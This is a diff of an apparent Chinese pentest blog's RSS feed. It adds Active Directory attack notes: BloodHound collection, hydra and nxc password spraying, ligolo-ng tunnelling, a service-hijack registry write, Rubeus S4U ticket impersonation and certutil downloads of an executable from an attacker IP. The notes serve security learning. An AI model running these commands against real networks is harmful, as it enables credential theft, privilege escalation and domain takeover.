@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>域之魔法 on wackymaker</title>
-        <link>https://wackymaker.github.io/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/</link>
+        <link>http://localhost:1313/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/</link>
         <description>Recent content in 域之魔法 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 11 Oct 2025 19:40:56 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 31 Oct 2025 19:40:56 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>血缇之书</title>
-        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
-        <pubDate>Sat, 11 Oct 2025 19:40:56 +0800</pubDate>
+        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <pubDate>Fri, 31 Oct 2025 19:40:56 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
@@ -145,8 +145,28 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -k -i $ip --fqdn-resolver --adcs -z -o ./ 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ldap被禁用的情况下能使用ldaps加密连接&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rusthound -d $domain -u $user1@$domain -p $pass1 -f $FQDN -i $ip --fqdn-resolver --adcs -z -o ./ --ldapport &lt;span style=&#34;color:#ae81ff&#34;&gt;636&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dns服务不正常（透过代理抓取）处理办法:&lt;/p&gt;
+&lt;p&gt;生成krb5.conf&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb $ip --generate-krb5-file krb5.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;删除原conf&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rm /etc/krb5.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;替换&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mv krb5.conf /etc/krb5.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后抓取&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;proxychains4 rusthound -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$domain&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -k  -o ./ -z --ldaps -f &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$dc&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;bloodhound-python&#34;&gt;bloodhound-python
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dns服务不正常（透过代理抓取）处理办法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 先将dc写入hosts&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 之后利用dnsmasq将本地充当dns服务器进行本地解析&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 如果没有需要下载一个&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install dnsmasq
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 将/etc/dnsmasq.conf内容写入如下内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;address/DC01.domain.com/10.10.10.10
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 之后重启dnsmasq服务&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo systemctl restart dnsmasq
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 指定ns为自身正常抓取&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodhound-python -d $domain -c ALL -u $user -p $pass -ns 127.0.0.1 -dc $host --zip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ldap查询包含匿名ldap&#34;&gt;ldap查询(包含匿名ldap)
 &lt;/h3&gt;&lt;h4 id=&#34;ldapdomaindump抓取所有ldap信息生成可视化图表&#34;&gt;ldapdomaindump抓取所有ldap信息生成可视化图表
 &lt;/h4&gt;&lt;p&gt;用户凭证&lt;/p&gt;
@@ -320,6 +340,8 @@ powerview&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;winrm密码喷洒
 nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;mssql爆破 （九头蛇&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hydra $ip mssql -L ./user.txt -P ./pass.txt
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dc存活用户枚举&#34;&gt;dc存活用户枚举
 &lt;/h3&gt;&lt;h4 id=&#34;kerbrute爆破&#34;&gt;kerbrute爆破
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kerbrute userenum --dc $ip -d $domain /opt/user.txt
@@ -977,7 +999,7 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wg-socks &lt;span style=&#34;color:#75715e&#34;&gt;# 查看存活代理id&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wg-socks stop &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;tun流量虚拟网卡适合一级内网&#34;&gt;tun流量虚拟网卡（适合一级内网）
-&lt;/h2&gt;&lt;h3 id=&#34;ligolo-ng虚拟网卡&#34;&gt;ligolo-ng虚拟网卡
+&lt;/h2&gt;&lt;h3 id=&#34;ligolo-ng虚拟网卡反向&#34;&gt;ligolo-ng虚拟网卡(反向)
 &lt;/h3&gt;&lt;p&gt;如果只是想通过边界入侵一层内网，ligolo是最好的选择，我们可以抛弃繁杂的proxychains&lt;/p&gt;
 &lt;p&gt;ligolo的原理是搭建一条tun隧道，也就是建立一条虚拟网卡并指向指定路由，这种原理导致其十分稳定且好用，并且其只需要一个服务端就可以做到多个客户端连接并且切换使用路由的操作&lt;/p&gt;
 &lt;p&gt;前置操作-攻击机(kali)执行-创建虚拟网卡&lt;/p&gt;
@@ -999,7 +1021,13 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;先链接新的客户端，或者当前客户端，之后直接添加新路由即可
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip route add 10.0.56.0/24 dev ligolo 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;不要删除原有的10.0.52.0路由，两者共存才能同时访问两个网段
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;msf动态路由&#34;&gt;msf动态路由
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ligolo-ng虚拟网卡正向&#34;&gt;ligolo-ng虚拟网卡(正向)
+&lt;/h3&gt;&lt;p&gt;其余设置与反向一致，只是连接以agent充当服务器&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./agent -bind 0.0.0.0:9001
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;先进入ligolo，之后本地主动连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ligolo-ng » connect_agent --ip $入口机:9001
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后start即可&lt;/p&gt;
+&lt;h3 id=&#34;msf动态路由&#34;&gt;msf动态路由
 &lt;/h3&gt;&lt;p&gt;msf的动态路由相当于一个专属于它自己的代理，当我们获取一个目标的msf载荷之后，可以直接配置动态路由来进行msf方便的内网入侵&lt;/p&gt;
 &lt;p&gt;这里我模拟我们搞到了一台内网session 1,其内网网段模拟为169.254.12.1,执行以下命令&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use post/multi/manage/autoroute
@@ -1099,6 +1127,9 @@ nxc&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell -ep bypass -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所有检查 + 所有报告&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell -ep bypass -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_&lt;/span&gt;$($env:COMPUTERNAME)&lt;span style=&#34;color:#e6db74&#34;&gt; -Format TXT,HTML,CSV,XML&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;notes&#34;&gt;notes
+&lt;/h4&gt;&lt;p&gt;服务劫持注册表写法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add HKLM&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;YSTEM&lt;span style=&#34;color:#ae81ff&#34;&gt;\C&lt;/span&gt;urrentControlSet&lt;span style=&#34;color:#ae81ff&#34;&gt;\S&lt;/span&gt;ervices&lt;span style=&#34;color:#ae81ff&#34;&gt;\g&lt;/span&gt;update /v ImagePath /t REG_EXPAND_SZ /d  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\ProgramData\sb.exe&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;bypassuac&#34;&gt;bypassUAC
 &lt;/h2&gt;&lt;h3 id=&#34;gui下绕过uac&#34;&gt;GUI下绕过uac
 &lt;/h3&gt;&lt;p&gt;当然，一般情况使用右键管理员运行即可，如果我们只有cmd或者powershell情况或者在kiosk情况下，可以利用powershell运行如下命令&lt;/p&gt;
@@ -1988,7 +2019,7 @@ nxc&lt;/p&gt;
 &lt;/h2&gt;&lt;h3 id=&#34;无约束&#34;&gt;无约束
 &lt;/h3&gt;&lt;h4 id=&#34;rubeus&#34;&gt;rubeus
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dir \\cdc01\pipe\spoolss
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\Rubeus.exe monitor /interval&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; /filteruser&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;CDC01$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Rubeus.exe monitor /interval&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; /nowrap /targetuser&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;CDC01$
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.\SpoolSample.exe CDC01 APPSRV01
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Rubeus.exe ptt /ticket&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;doIFIjCCBR.......
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;nxc加krbrelayx&#34;&gt;nxc加krbrelayx
@@ -2006,18 +2037,20 @@ nxc&lt;/p&gt;
 &lt;/h3&gt;&lt;h4 id=&#34;可转发情况&#34;&gt;可转发情况
 &lt;/h4&gt;&lt;h5 id=&#34;rubeus-1&#34;&gt;rubeus
 &lt;/h5&gt;&lt;p&gt;为可以约束委派的用户请求tgt&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgt /user:$user /password:$pass /domain:$domain /outfile:ticket.kirbi
+&lt;p&gt;密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgt /user:$user /password:$pass /domain:$domain /nowrap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;hash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe asktgt /user:$user /rc4:$hash /domain:$domain /nowrap
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用这个票据去请求管理员或者dc机器用户的票据并注入内存&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.painters.htb /impersonateuser:DC$ /domain:painters.htb /altservice:CIFS,HOST,LDAP /ptt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;ubeus.exe s4u /ticket:$ticket /msdsspn:cifs/dc.$domain /impersonateuser:$target_or_admin /domain:$domain /ptt
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##解释&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s4u	使用 S4U（Service &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; User）攻击模块，结合 S4U2Self + S4U2Proxy
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ticket:ticket.kirbi	提供用于身份的 TGT 票据（由约束委派用户如 blake 获取）
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/msdsspn:cifs/dc.painters.htb	指定委派目标服务的 SPN，也就是该服务已被允许约束委派
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/impersonateuser:DC$	想要伪造的用户账户（此处是域控的计算机账户）
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/domain:painters.htb	目标域名
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/altservice:CIFS,HOST,LDAP	生成的 TGS 可用于多个服务（即 SPN 列表），常见于访问共享、远程登录、LDAP等
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ptt	“Pass The Ticket” —— 直接将生成的 TGS 注入当前会话中（无需再导出使用）
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;搞定管理员或者dc后直接打dcsync即可&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;搞定管理员或者dc后直接打dcsync即可,或者直接psexec&lt;/p&gt;
 &lt;h5 id=&#34;impacket&#34;&gt;impacket
 &lt;/h5&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-getTGT $domain/$user -hashes $hash -dc-ip $ip
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;or
@@ -3173,7 +3206,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//你的IP/文件路径 保存路径
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;192.168&lt;/span&gt;.174.&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.exe C:\windows\tasks\&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.exe
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell
